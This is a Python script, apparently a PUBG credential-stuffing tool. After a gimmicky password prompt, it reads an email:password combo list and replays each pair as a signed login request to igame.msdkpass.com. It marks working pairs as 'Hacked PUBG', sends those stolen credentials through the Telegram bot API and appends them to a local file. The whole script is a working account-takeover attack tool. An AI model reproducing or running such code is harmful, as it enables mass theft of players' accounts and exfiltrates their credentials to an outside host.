import requests,hashlib,random,string,time,os,webbrowser

E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'

r = requests.session()
print(f"""
{E}

       __ _  _ \ / _ ___ __   ___
      /  / \|_) Y |_) | /__|_| | 
      \__\_/|   | | \_|_\_|| | | 

 
___  __   __   __   __   __   __             
 |  |__) |__) |__) /  \ / _` |__)  /\   |\/| 
 |  |  \ |    |  \ \__/ \__> |  \ /~~\  |  | 

 {G}
 Programing By | @trprogram  
""")
reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("Thanks..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("wow..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("Thanks..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("wow..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("Thanks..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("wow..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("Thanks..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("wow..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("Thanks..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("wow..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("Thanks..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        reaper = input ("Enter Password : ")
if reaper == "EYE" :
        print ("wow..."*4)
else :
        print ("ERROR... ENTER PASSWORD...")
        webbrowser.open('http://t.me/trprogram') 
        
ID= input('[+] Enter YOUR ID : ')
token = input('[+] Enter TOKEN BOT : ')
R = (random.randint(0,9))
headPUB = {
	"Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
def CHECK(email,pess):
  eml = email
  pas = pess
  YES = f"""
[✅] Hacked PUBG :
[✅] Email: {eml}
[✅] Pass: {pas}
[✅] Season : {R}
━━━━━━━━━━━━━"""
  NO = f"""
[-] NOT Hacked PUBG :
[-] Email: {eml}
[-] Pass: {pas}
━━━━━━━━━━━━━"""
  pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
  J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
  url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
  daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
  time.sleep(0.5)
  GO=r.get(url, data=daPU,headers=headPUB).text
  if '"token"' in GO:
    print(YES)
    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @AhmedoPlus @vv1ck 💸')
    with open('NWE-PUBG.txt', 'a') as x:
      x.write(eml+':'+pas+' |@trprogram\n')
  else:
    print(NO)
def FILname():
  F = input('[+] Enter the name the combo file : ')
  try:
    for x in open(F,'r').read().splitlines():
      email = x.split(":")[0]
      pess = x.split(":")[1]
      CHECK(email,pess)
  except FileNotFoundError:
    print('\n[-] The file name is incorrect !\n')
    return FILname()
FILname()
